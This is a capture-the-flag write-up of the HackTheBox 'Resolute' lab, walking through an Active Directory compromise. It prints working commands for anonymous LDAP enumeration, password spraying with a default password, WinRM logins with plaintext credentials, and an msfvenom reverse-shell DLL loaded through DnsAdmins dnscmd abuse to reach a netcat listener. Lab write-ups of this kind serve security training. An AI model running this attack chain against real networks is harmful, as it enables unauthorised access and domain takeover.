Resolute — HTB Writeup

Introduction:

Welcome back everyone! This is my fourth installment in my AD mini series of HackTheBox labs. This is the first medium machine that I’ve done that focuses on Active Directory. This lab focuses on anonymously binding to ldap and finding the password that is used for all new user accounts and then gaining a foothold with a user that still has that same password on their account. After that, you move laterally to a user that is a member of the DnsAdmins group, which has permissions to specify the DNS service to load a plugin DLL. I’ve been having a blast doing these labs so let’s get started on it.

Enumeration:

I’ll start off with an nmap scan.

nmap -sCV -A -p- -v <TARGET IP>

Let’s look at the results.

Per usual, the same ports that have been open on the past few machines are also open on this one. I did get the domain name megabank.local and ports such as ldap, smb, dns, etc. open on the target. I’ll test ldap first on this machine.

ldapsearch -H ldap://<TARGET IP> -x -b "dc=megabank,dc=local"

Using what I like to call the test command, I am able to anonymously bind with ldapsearch and gain information about the domain. Now I will modify it to see if I can get any information on the users in the domain.

ldapsearch -H ldap://<TARGET IP> -x -b "dc=megabank,dc=local" "(objectClass=user)" description

This line will return to me anything in the description of the user accounts and all of the users in the domain. It should give me a hint in how to move forward next.

I did notice that it looks like there is a default password that is used for new user accounts. the password is Welcome123!.I’ll bet that one of them still has that password set on theirs. I’ll use rpcclient to connect and get a more concise list of users in the domain.

rpcclient -U "" -N <TARGET IP>

Gaining a Foothold:

Now that I have all the users listed, I will add them all to a .txt file and password spray to see if I can get a hit on users still using that same password.

netexec smb <TARGET IP> -u users.txt -p 'Welcome123!' --no-bruteforce --continue-on-success

I’ll use netexec for this. I specify to only try the password once for each user that I put in the file.

I got a hit on the melanie user! I did notice that port 5985 was open so I can use evil-winrm to get a session as the user. With a successful set of credentials, I can login and get the user flag.

evil-winrm -i <TARGET IP> -u melanie -p Welcome123!
cd ..
cd Desktop
ls

I got the user flag! now I should start thinking about how I am going to escalate my privileges and get that root flag.

Privilege Escalation:

If you know me, you know that this next step is my least favorite part of the labs. Looking through and trying to find anything useful so that I can move up the ladder. After looking through every directory and file that I could find. I felt like it was a lost cause and i was stumped. After some research, I remembered that hidden files and folders could be a thing so I modified my commands to see if there really was anything hidden.

dir -force

Starting at the C:\ directory, I did find a hidden PSTranscripts directory! I decide to dig deeper into what it might hold.

cd PSTranscripts
dir -force
cd 20191203
dir -force

I found a .txt file that seems like it could hold some useful information. I opened the file up and found this.

This file had a lot of content within it. The best thing in it though was that it had the password for the ryan user logged in the file. Now that I have another user, I can login as them and enumerate further to see if there are any more potential attack vectors for me to find.

evil-winrm -i <TARGET IP> -u ryan -p Serv3r4Admin4cc123!
whoami /groups

As soon as I login as the ryan user, I’ll check and see what groups they are apart of so I can see if there is any that have special privileges. I saw that ryan is a part of the DnsAdmins group. The special part about this group is that members of this group can load a plugin DLL into the Dns service. What I am starting to think now is that I can load a reverse shell into the service and gain the needed permissions to get that last flag. So I will do just that.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<OWN IP> LPORT=<ANY> --platform=windows -f dll > dns.dll

I’ll use msfvenom to make the malicious plugin. It will include the reverse shell in it and all I have to do now is get it on the domain and I should be all good to go.

nc -lvnp 4444

I’ll go ahead and start my listener so that will be ready.

smbserver.py share ./

Since smb was open according to the nmap results, I’ll use smbserver.py to activate a share from my host directory containing the malicious plugin.

dnscmd.exe /config /serverlevelplugindll \\<OWN IP>\share\dns.dll
sc.exe stop dns
sc.exe start dns

I’ll use the dnscmd.exe binary to download and run the plugin from my host machine. After I get that I stop the dns service and then I will start it again so that the plugin fully runs. Now that I have done that, I’ll go back to my netcat listener.

whoami
cd ..
cd ..
cd \Users\Administrator\Desktop
dir
